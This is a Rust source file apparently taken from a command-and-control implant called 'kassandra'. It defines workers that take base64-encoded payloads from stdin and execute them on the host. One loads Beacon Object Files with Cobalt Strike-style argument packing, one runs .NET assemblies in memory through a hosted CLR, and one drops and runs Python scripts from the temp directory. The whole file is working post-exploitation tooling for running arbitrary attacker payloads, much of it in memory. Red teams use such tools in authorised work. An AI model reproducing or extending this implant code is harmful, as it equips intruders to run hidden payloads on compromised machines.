use std::io::Read;
use serde_json::Value;
use base64::engine::general_purpose;
use base64::Engine;
use coffeeldr::{CoffeeLdr, BeaconPack};
use clroxide::clr::Clr;

pub fn run_bof_worker() {
    let mut input = String::new();
    std::io::stdin().read_to_string(&mut input).expect("worker: failed to read stdin");

    let data: Value = serde_json::from_str(&input).expect("worker: failed to parse input");
    let file_bytes = general_purpose::STANDARD
        .decode(data["file_bytes"].as_str().expect("worker: missing file_bytes"))
        .expect("worker: failed to decode file_bytes");
    let params_str = data["parameters"].as_str().unwrap_or("").trim().to_string();

    let mut output = String::new();

    match CoffeeLdr::new(file_bytes.as_slice()) {
        Ok(mut ldr) => {
            output.push_str("COFF loaded!\n");

            if params_str.is_empty() {
                match ldr.run("go", None, None) {
                    Ok(res) => output.push_str(&res),
                    Err(e) => output.push_str(&format!("Run error: {:?}\n", e)),
                }
            } else {
                let mut pack = BeaconPack::default();

                for arg in params_str.split_whitespace() {
                    if let Err(e) = pack.addstr(arg) {
                        output.push_str(&format!("Arg error ({}): {}\n", arg, e));
                    }
                }

                match pack.get_buffer_hex() {
                    Ok(buf) => {
                        let ptr = buf.as_ptr() as *mut u8;
                        let len = buf.len();

                        match ldr.run("go", Some(ptr), Some(len)) {
                            Ok(res) => output.push_str(&res),
                            Err(e) => output.push_str(&format!("Run error: {:?}\n", e)),
                        }

                        std::mem::forget(buf);
                    }
                    Err(e) => {
                        output.push_str(&format!("Pack error: {}\n", e));
                    }
                }
            }
        }
        Err(e) => output.push_str(&format!("Load error: {:?}\n", e)),
    }

    print!("{}", output);
}

pub fn run_dot_worker() {
    let mut input = String::new();
    std::io::stdin().read_to_string(&mut input).expect("worker: failed to read stdin");

    let data: Value = serde_json::from_str(&input).expect("worker: failed to parse input");
    let file_bytes = general_purpose::STANDARD
        .decode(data["file_bytes"].as_str().expect("worker: missing file_bytes"))
        .expect("worker: failed to decode file_bytes");
    let params_str = data["parameters"].as_str().unwrap_or("");
    let args: Vec<String> = params_str.split_whitespace().map(|s| s.to_string()).collect();

    match Clr::new(file_bytes, args) {
        Ok(mut clr) => match clr.run() {
            Ok(output) => print!("{}", output),
            Err(e) => {
                eprint!("DOT execution error: {:?}", e);
                std::process::exit(1);
            }
        },
        Err(e) => {
            eprint!("DOT load error: {:?}", e);
            std::process::exit(1);
        }
    }
}

pub fn run_py_worker() {
    let mut input = String::new();
    std::io::stdin().read_to_string(&mut input).expect("worker: failed to read stdin");

    let data: Value = serde_json::from_str(&input).expect("worker: failed to parse input");
    let file_bytes = general_purpose::STANDARD
        .decode(data["file_bytes"].as_str().expect("worker: missing file_bytes"))
        .expect("worker: failed to decode file_bytes");
    let params_str = data["parameters"].as_str().unwrap_or("").trim().to_string();

    let mut output = String::new();

    let tmp_dir = std::env::temp_dir();
    let script_path = tmp_dir.join("kassandra_exec.py");
    if let Err(e) = std::fs::write(&script_path, &file_bytes) {
        eprint!("PY write error: {:?}", e);
        std::process::exit(1);
    }

    let mut cmd = std::process::Command::new("python");
    cmd.arg(&script_path);
    if !params_str.is_empty() {
        cmd.args(params_str.split_whitespace());
    }

    match cmd.output() {
        Ok(res) => {
            output.push_str(&String::from_utf8_lossy(&res.stdout));
            if !res.status.success() {
                let stderr = String::from_utf8_lossy(&res.stderr);
                if !stderr.is_empty() {
                    output.push_str("\nstderr: ");
                    output.push_str(&stderr);
                }
                eprint!("{}", output);
                let code = res.status.code().unwrap_or(1);
                std::process::exit(code);
            }
            print!("{}", output);
        }
        Err(e) => {
            eprint!("PY exec error: {:?}", e);
            std::process::exit(1);
        }
    }
}
